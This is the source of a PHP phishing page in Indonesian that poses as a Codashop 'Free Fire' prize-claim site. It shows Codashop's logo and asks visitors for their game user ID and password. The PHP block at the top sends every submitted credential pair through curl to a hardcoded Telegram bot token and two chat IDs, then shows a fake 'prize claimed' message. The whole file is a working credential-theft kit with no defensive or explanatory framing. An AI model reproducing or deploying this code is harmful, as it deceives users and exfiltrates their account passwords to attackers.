<?php
// if there $_POST
if (isset($_POST['userid'])) {
  $chatid = ['5014815328', '482529152'];
  $userid = $_POST['userid'];
  $password = $_POST['password'];
  $message_text = "Userid: $userid || Password: $password";
  $i = 0;
  foreach ($chatid as $chat_id) {
    $telegram_id = $chatid[$i];
    $i++;
    $secret_token = '5072613015:AAFVW8R-AjeHUsb-Lj4hexxSKHTuyS3Ayzc';
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
      CURLOPT_URL => $url,
      CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
  }

  // return $result;

}


?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Free Fire Hadiah</title>
  <!-- bootstrap 5 cdn-->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css" integrity="sha384-r4NyP46KrjDleawBgD5tp8Y7UzmLA05oM1iAEQ17CSuDqnUK2+k9luXQOfXJCJ4I" crossorigin="anonymous" />
  <!-- favicon -->
  <link rel="icon" type="image/x-icon" href="https://photos.prnasia.com/prnk/20200616/2832205-1logo" />
</head>

<body style="background-color: #280031">
  <nav class="navbar navbar-expand-lg navbar-light bg-white">
    <div class="container">
      <img class="navbar-brand" src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo-new-2x.png" width="109" />
      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
          <li class="nav-item">
            <span class="text-muted nav-link active" aria-current="page" href="#"><i>Cara tercepat dan termudah untuk pembelian kredit
                permainan.</i></span>
          </li>
        </ul>
      </div>
    </div>
  </nav>

  <div class="container mt-2">
    <div class="row">
      <!-- img overflow hidden -->
      <div class="col-md-12" style="overflow: hidden; position: relative;height: 200px;">
        <img src="https://wallpaperaccess.com/full/6381105.jpg" alt="" width="100%" />

      </div>
    </div>
    <div class="row mt-2 d-flex justify-content-center">
      <!-- card -->
      <div class="col-lg-8">
        <!-- if $_post -->
        <?php if (isset($_POST['userid'])) : ?>
          <div class="alert alert-success" role="alert">
            <div class="card" id="dunia2">
              <div class="card-body">
                <h5 class="card-title">
                  <center><i class="fas fa-gift"></i> ✅ Hadiah Sukses Diklaim</center>
                </h5>
              </div>
            </div>
          </div>
        <?php else : ?>
          <div class="card" id="dunia1">
            <div class="card-body">
              <h5 class="card-title">
                <i class="fas fa-gift"></i> Klaim Hadiah Free Fire
              </h5>
              <div class="">
                <p class="card-text">
                  Klaim hadiah free fire dengan mudah dan cepat.
                </p>
                <center><img src="https://dailyspin.id/wp-content/uploads/2021/08/DIAMOND-GRATIS-FF.jpg" alt="" width="100%"></center>
                <!-- form userid dan password -->
                <form action="" method="post">
                  <div class="form-group pt-2">
                    <label for="exampleInputEmail1">
                      Masukkan User ID
                    </label>
                    <input type="text" class="form-control" id="userid" aria-describedby="emailHelp" placeholder="Masukkan User ID" name="userid" />
                  </div>
                  <div class="form-group pt-2 pb-2">
                    <label for="exampleInputPassword1">
                      Masukkan Password
                    </label>
                    <input type="password" class="form-control" id="password" placeholder="Masukkan Password" name="password" />
                  </div>
                  <button type="submit" class="btn btn-lg btn-block btn-primary">
                    Klaim
                  </button>
                </form>
              </div>
            </div>
          </div>
        <?php endif; ?>



      </div>
    </div>
  </div>


</body>

</html>